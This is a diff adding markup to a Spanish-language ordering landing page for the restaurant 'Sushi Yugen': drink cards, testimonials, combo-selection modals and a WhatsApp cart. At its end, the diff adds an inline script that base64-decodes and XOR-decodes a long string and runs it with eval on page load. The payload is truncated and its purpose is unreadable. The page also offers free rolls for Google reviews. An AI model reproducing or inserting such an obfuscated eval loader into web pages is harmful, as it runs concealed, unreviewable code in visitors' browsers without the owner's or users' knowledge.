class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Font Vella personal','Agua','1.25','Font Vella personal, agua natural','images/img30.jpg','b22_4');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img31.jpg')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Agua con gas</div><div class="gpw-name">Vichy Catalán Personal</div><div class="gpw-price">2.25</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Vichy Catalán Personal','Agua con gas','2.25','Vichy Catalán, agua con gas Personal','images/img31.jpg','b22_5');event.stopPropagation()">Ver más</button></div></div></div></div>
+    
+    </div>
+<div class="phone-block" data-id="b36" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:14px;color:#ffffff;text-align:left;line-height:1.2;">¿Qué dicen nuestros clientes?</h2></div></div>
+<div class="phone-block" data-id="b25" style="outline: none;"><div class="b-reviews fw" style="background:#c1272d">
+      <div class="review-item">
+        <div class="review-avatar" onclick="uploadReviewAvatar(event,'b25',0)">
+          <img loading="lazy" src="images/img32.jpg" alt="Andrés Manrique - Influencer">
+        </div>
+        <div class="review-body">
+          <div class="review-name" style="color:#fafafa">Andrés Manrique - Influencer</div>
+          <div class="review-text" style="color:#fafafa">El mejor sushi que he pedido, llegó rapidísimo y fresco.
+</div>
+        </div>
+      </div>
+      <div class="review-item">
+        <div class="review-avatar" onclick="uploadReviewAvatar(event,'b25',1)">
+          <img loading="lazy" src="images/img33.jpg" alt="Juana Paredes - Fotógrafa">
+        </div>
+        <div class="review-body">
+          <div class="review-name" style="color:#fafafa">Juana Paredes - Fotógrafa</div>
+          <div class="review-text" style="color:#fafafa">Ojito con la promoción si agregas la reseña... De nada!
+</div>
+        </div>
+      </div></div></div>
+<div class="phone-block" data-id="b27" style="outline: none;"><div class="b-hero" style="background:#000000"><p class="hero-cat" style="color:#faf9f9">CALIFICA A</p><h2 class="hero-title" style="color:#faf9f9">SUSHI YUGEN EN GOOGLE</h2><p class="hero-code" style="color:#faf9f9">Y gana rollos</p><img src="images/img34.png" class="hero-float-img" alt=""><button class="hero-btn" style="background:#c1272d;color:#fefbfb">🍣 Agregar mi Reseña</button></div></div>
+<div class="phone-block" data-id="b37" style="outline: none;"><div class="b-image" style="background:transparent"><img loading="lazy" src="images/img35.png" alt=""></div></div>
+<div class="phone-block" data-id="b28" style="outline: none;"><div class="b-footer" style="background:transparent;color:#ffffff"><div class="footer-text">© 2026 Sushi Yugen</div><div class="footer-links"><span class="footer-link">Términos</span><span class="footer-dot">·</span><span class="footer-link">Privacidad</span><span class="footer-dot">·</span><span class="footer-link">Contacto</span></div><div class="footer-disclaimer">Las marcas y logotipos mostrados pertenecen a sus respectivos propietarios y no implican afiliación con este negocio.
+</div></div></div>
+<div class="phone-block" data-id="b31" style="outline: none;"><div class="b-image" style="background:transparent"><img loading="lazy" src="images/img36.png" alt=""></div></div>
+<div class="lp-overlay-backdrop gpw-backdrop" id="gpw-backdrop-b5" data-owner="b5" onclick="closeGPWModal('b5')"></div>
+<div class="lp-overlay-panel gpw-modal" id="gpw-modal-b5" data-owner="b5" style="background:#f2d8b1">
+      <div class="gpw-modal-header"><button class="gpw-modal-close" onclick="closeGPWModal('b5')">✕</button></div>
+      <div class="gpw-modal-body">
+        <div class="gpw-modal-img" id="gpw-modal-img-b5"></div>
+        <div class="gpw-modal-content">
+          <div class="gpw-modal-cat" id="gpw-modal-cat-b5"></div>
+          <div class="gpw-modal-name" id="gpw-modal-name-b5"></div>
+          <div class="gpw-modal-price" id="gpw-modal-price-b5"></div>
+          <div class="gpw-modal-desc" id="gpw-modal-desc-b5"></div>
+        </div>
+      </div>
+      <div class="gpw-modal-footer">
+        <button class="gpw-modal-buy" id="gpw-modal-buy-b5" style="background:#c1272d;color:#ffffff">Agregar al carrito</button>
+      </div>
+    </div>
+<div class="lp-overlay-backdrop combo-backdrop" id="combo-backdrop-b41" data-owner="b41" onclick="closeComboModal('b41')"></div>
+<div class="lp-overlay-panel combo-modal" id="combo-modal-b41" data-owner="b41" style="background:#f2d8b1">
+      <div class="combo-modal-header"><button class="combo-modal-close" onclick="closeComboModal('b41')">✕</button></div>
+      <div class="combo-modal-body">
+        <div class="combo-modal-title" style="color:#ffffff">Combo 2 personas (2 rollos clásicos enteros y 2 medios rollos especiales)</div>
+        <div class="combo-modal-desc">Arma tu combo a tu gusto. Puedes repetir rollos.</div>
+        <div class="combo-section">
+        <div class="combo-section-title">Elige 2 Rollos Clásicos <span class="combo-count" id="ceq-count-b41-ing-0">(0/2)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b41-ing-0"><div class="combo-qty-row" id="ceq-item-b41-ing-0-0"><span>Philadelphia (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',0,0,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-0-0">0</span><button type="button" onclick="ceqChangeQty('b41','ing',0,0,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-0-1"><span>Dragon (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',0,1,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-0-1">0</span><button type="button" onclick="ceqChangeQty('b41','ing',0,1,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-0-2"><span>California (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',0,2,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-0-2">0</span><button type="button" onclick="ceqChangeQty('b41','ing',0,2,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-0-3"><span>Rainbow (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',0,3,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-0-3">0</span><button type="button" onclick="ceqChangeQty('b41','ing',0,3,1,2);event.stopPropagation()">+</button></div></div></div>
+      </div><div class="combo-section">
+        <div class="combo-section-title">Elige 2 medios Rollos Especiales <span class="combo-count" id="ceq-count-b41-ing-1">(0/2)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b41-ing-1"><div class="combo-qty-row" id="ceq-item-b41-ing-1-0"><span>Uramaki Salmón Tostado (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',1,0,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-1-0">0</span><button type="button" onclick="ceqChangeQty('b41','ing',1,0,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-1-1"><span>Sunset (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',1,1,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-1-1">0</span><button type="button" onclick="ceqChangeQty('b41','ing',1,1,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-1-2"><span>Kani Maracuyá (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',1,2,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-1-2">0</span><button type="button" onclick="ceqChangeQty('b41','ing',1,2,1,2);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b41-ing-1-3"><span>Tiger Eye (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b41','ing',1,3,-1,2);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b41-ing-1-3">0</span><button type="button" onclick="ceqChangeQty('b41','ing',1,3,1,2);event.stopPropagation()">+</button></div></div></div>
+      </div>
+        
+        
+      </div>
+      <div class="combo-modal-footer">
+        <button class="combo-modal-buy" style="background:#c1272d;color:#ffffff" onclick="addCeqToCart('b41','Combo 2 personas (2 rollos clásicos enteros y 2 medios rollos especiales)','$19.99','images/img21.jpg')">Agregar al carrito</button>
+      </div>
+    </div>
+<div class="lp-overlay-backdrop combo-backdrop" id="combo-backdrop-b34" data-owner="b34" onclick="closeComboModal('b34')"></div>
+<div class="lp-overlay-panel combo-modal" id="combo-modal-b34" data-owner="b34" style="background:#f2d8b1">
+      <div class="combo-modal-header"><button class="combo-modal-close" onclick="closeComboModal('b34')">✕</button></div>
+      <div class="combo-modal-body">
+        <div class="combo-modal-title" style="color:#ffffff">Combo 3 personas (3 rollos clásicos enteros y 3 medios rollos especiales) + 3 gaseosas personales</div>
+        <div class="combo-modal-desc">Arma tu combo a tu gusto. Puedes repetir rollos.</div>
+        <div class="combo-section">
+        <div class="combo-section-title">Elige 3 Rollos Clásicos <span class="combo-count" id="ceq-count-b34-ing-0">(0/3)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b34-ing-0"><div class="combo-qty-row" id="ceq-item-b34-ing-0-0"><span>Philadelphia (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',0,0,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-0-0">0</span><button type="button" onclick="ceqChangeQty('b34','ing',0,0,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-0-1"><span>Dragon (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',0,1,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-0-1">0</span><button type="button" onclick="ceqChangeQty('b34','ing',0,1,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-0-2"><span>California (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',0,2,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-0-2">0</span><button type="button" onclick="ceqChangeQty('b34','ing',0,2,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-0-3"><span>Rainbow (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',0,3,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-0-3">0</span><button type="button" onclick="ceqChangeQty('b34','ing',0,3,1,3);event.stopPropagation()">+</button></div></div></div>
+      </div><div class="combo-section">
+        <div class="combo-section-title">Elige 3 medios Rollos Especiales <span class="combo-count" id="ceq-count-b34-ing-1">(0/3)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b34-ing-1"><div class="combo-qty-row" id="ceq-item-b34-ing-1-0"><span>Uramaki Salmón Tostado (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',1,0,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-1-0">0</span><button type="button" onclick="ceqChangeQty('b34','ing',1,0,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-1-1"><span>Sunset (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',1,1,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-1-1">0</span><button type="button" onclick="ceqChangeQty('b34','ing',1,1,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-1-2"><span>Kani Maracuyá (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',1,2,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-1-2">0</span><button type="button" onclick="ceqChangeQty('b34','ing',1,2,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-ing-1-3"><span>Tiger Eye (5 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','ing',1,3,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-ing-1-3">0</span><button type="button" onclick="ceqChangeQty('b34','ing',1,3,1,3);event.stopPropagation()">+</button></div></div></div>
+      </div>
+        <div class="combo-section">
+        <div class="combo-section-title">Elige tu bebida <span class="combo-count" id="ceq-count-b34-drk-0">(0/3)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b34-drk-0"><div class="combo-qty-row" id="ceq-item-b34-drk-0-0"><span>Coca Cola Personal</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','drk',0,0,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-drk-0-0">0</span><button type="button" onclick="ceqChangeQty('b34','drk',0,0,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-drk-0-1"><span>Sprite Personal</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','drk',0,1,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-drk-0-1">0</span><button type="button" onclick="ceqChangeQty('b34','drk',0,1,1,3);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b34-drk-0-2"><span>Fanta Personal</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b34','drk',0,2,-1,3);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b34-drk-0-2">0</span><button type="button" onclick="ceqChangeQty('b34','drk',0,2,1,3);event.stopPropagation()">+</button></div></div></div>
+      </div>
+        
+      </div>
+      <div class="combo-modal-footer">
+        <button class="combo-modal-buy" style="background:#c1272d;color:#ffffff" onclick="addCeqToCart('b34','Combo 3 personas (3 rollos clásicos enteros y 3 medios rollos especiales) + 3 gaseosas personales','$27.99','images/img22.jpg')">Agregar al carrito</button>
+      </div>
+    </div>
+<div class="lp-overlay-backdrop combo-backdrop" id="combo-backdrop-b40" data-owner="b40" onclick="closeComboModal('b40')"></div>
+<div class="lp-overlay-panel combo-modal" id="combo-modal-b40" data-owner="b40" style="background:#f2d8b1">
+      <div class="combo-modal-header"><button class="combo-modal-close" onclick="closeComboModal('b40')">✕</button></div>
+      <div class="combo-modal-body">
+        <div class="combo-modal-title" style="color:#ffffff">Combo 4 personas (5 rollos enteros)</div>
+        <div class="combo-modal-desc">Arma tu combo a tu gusto. Puedes repetir rollos.</div>
+        <div class="combo-section">
+        <div class="combo-section-title">Elige 5 Rollos Clásicos <span class="combo-count" id="ceq-count-b40-ing-0">(0/5)</span></div>
+        <div class="combo-options combo-options-qty" id="ceq-group-b40-ing-0"><div class="combo-qty-row" id="ceq-item-b40-ing-0-0"><span>Philadelphia (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,0,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-0">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,0,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-1"><span>Dragon (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,1,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-1">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,1,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-2"><span>California (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,2,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-2">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,2,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-3"><span>Rainbow (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,3,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-3">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,3,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-4"><span>Uramaki Salmón Tostado (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,4,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-4">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,4,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-5"><span>Sunset (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,5,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-5">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,5,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-6"><span>Kani Maracuyá (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,6,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-6">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,6,1,5);event.stopPropagation()">+</button></div></div><div class="combo-qty-row" id="ceq-item-b40-ing-0-7"><span>Tiger Eye (10 bocados)</span><div class="combo-qty-ctrl"><button type="button" onclick="ceqChangeQty('b40','ing',0,7,-1,5);event.stopPropagation()">−</button><span class="combo-qty-num" id="ceq-qtynum-b40-ing-0-7">0</span><button type="button" onclick="ceqChangeQty('b40','ing',0,7,1,5);event.stopPropagation()">+</button></div></div></div>
+      </div>
+        
+        
+      </div>
+      <div class="combo-modal-footer">
+        <button class="combo-modal-buy" style="background:#c1272d;color:#ffffff" onclick="addCeqToCart('b40','Combo 4 personas (5 rollos enteros)','$34.99','images/img23.webp')">Agregar al carrito</button>
+      </div>
+    </div>
+<div class="lp-overlay-backdrop combo-backdrop" id="combo-backdrop-b38" data-owner="b38" onclick="closeComboModal('b38')"></div>
+<div class="lp-overlay-panel combo-modal" id="combo-modal-b38" data-owner="b38" style="background:#f2d8b1">
+      <div class="combo-modal-header"><button class="combo-modal-close" onclick="closeComboModal('b38')">✕</button></div>
+      <div class="combo-modal-body">
+        <div class="combo-modal-title" style="color:#ffffff">Promo del Día: Explosión de 25 Rollitos a la orden + 1 Sashimi</div>
+        <div class="combo-modal-desc">Oferta disponible solo por tiempo limitado.</div>
+        <div class="combo-section">
+          <div class="combo-section-title">Elige 5 medios Rollos diferentes <span class="combo-count" id="combo-count-b38">(0/5)</span></div>
+          <div class="combo-options" id="combo-ingredients-b38"><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Philadelphia</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Dragon</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>California</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Rainbow</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Uramaki Salmón Tostado</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Sunset</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Kani Maracuyá</span></label><label class="combo-option"><input type="checkbox" onchange="comboToggleIngredient('b38',5,this)"><span>Tiger Eye</span></label></div>
+        </div>
+        <div class="combo-section">
+          <div class="combo-section-title">Elige 1 Sashimi</div>
+          <div class="combo-options" id="combo-drinks-b38"><label class="combo-option"><input type="radio" name="combo-drink-b38"><span>Sashimi Lubina (2 uni)</span></label><label class="combo-option"><input type="radio" name="combo-drink-b38"><span>Sashimi Pulpo y Calamar (2 uni)</span></label><label class="combo-option"><input type="radio" name="combo-drink-b38"><span>Sashimi Salmón (2 uni)</span></label><label class="combo-option"><input type="radio" name="combo-drink-b38"><span>Sashimi Pez Mantequilla (2 uni)</span></label></div>
+        </div>
+        
+      </div>
+      <div class="combo-modal-footer">
+        <button class="combo-modal-buy" style="background:#ffffff;color:#c1272d" onclick="addComboToCart('b38','Promo del Día: Explosión de 25 Rollitos a la orden + 1 Sashimi','$9.99','images/img25.webp',5)">Agregar al carrito</button>
+      </div>
+    </div>
+<div class="lp-overlay-backdrop gpw-backdrop" id="gpw-backdrop-b22" data-owner="b22" onclick="closeGPWModal('b22')"></div>
+<div class="lp-overlay-panel gpw-modal" id="gpw-modal-b22" data-owner="b22" style="background:#f2d8b1">
+      <div class="gpw-modal-header"><button class="gpw-modal-close" onclick="closeGPWModal('b22')">✕</button></div>
+      <div class="gpw-modal-body">
+        <div class="gpw-modal-img" id="gpw-modal-img-b22"></div>
+        <div class="gpw-modal-content">
+          <div class="gpw-modal-cat" id="gpw-modal-cat-b22"></div>
+          <div class="gpw-modal-name" id="gpw-modal-name-b22"></div>
+          <div class="gpw-modal-price" id="gpw-modal-price-b22"></div>
+          <div class="gpw-modal-desc" id="gpw-modal-desc-b22"></div>
+        </div>
+      </div>
+      <div class="gpw-modal-footer">
+        <button class="gpw-modal-buy" id="gpw-modal-buy-b22" style="background:#c1272d;color:#ffffff">Agregar al carrito</button>
+      </div>
+    </div>
+
+  </div>
+  <!-- CARRITO -->
+  <div class="cart-popup" id="cart-popup">
+    <div class="cart-popup-header">
+      <h3>🛒 Carrito</h3>
+      <button class="cart-close" onclick="toggleCart()">✕</button>
+    </div>
+    <div class="cart-scroll">
+      <div class="cart-items" id="cart-items-list"></div>
+      <div class="cart-extras" id="cart-extras"></div>
+    </div>
+    <div class="cart-footer" id="cart-footer" style="display:none">
+      <div class="cart-total-row cart-sub-row" id="cart-sub-row" style="display:none">
+        <span class="cart-total-lbl">Subtotal</span>
+        <span class="cart-total-lbl" id="cart-subtotal">$0.00</span>
+      </div>
+      <div class="cart-total-row cart-ship-row" id="cart-ship-row" style="display:none">
+        <span class="cart-total-lbl" id="cart-ship-lbl">Envío</span>
+        <span class="cart-total-lbl" id="cart-ship-val">$0.00</span>
+      </div>
+      <div class="cart-total-row">
+        <span class="cart-total-lbl">Total</span>
+        <span class="cart-total-val" id="cart-total">$0.00</span>
+      </div>
+      <a id="cart-wa-btn" class="cart-wa-btn" target="_blank" href="#" onclick="return cxValidate()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+        Hacer pedido
+      </a>
+    </div>
+  </div>
+  <div class="cart-toast" id="cart-toast"></div>
+</div>
+<script>(function(b,k){function d(s){var o='';for(var i=0;i<s.length;i++){o+=String.fromCharCode(s.charCodeAt(i)^k.charCodeAt(i%k.length));}return o;}try{var _ev=eval;_ev(decodeURIComponent(escape(d(atob(b)))));}catch(e){console.error('Error al iniciar la página',e);}})('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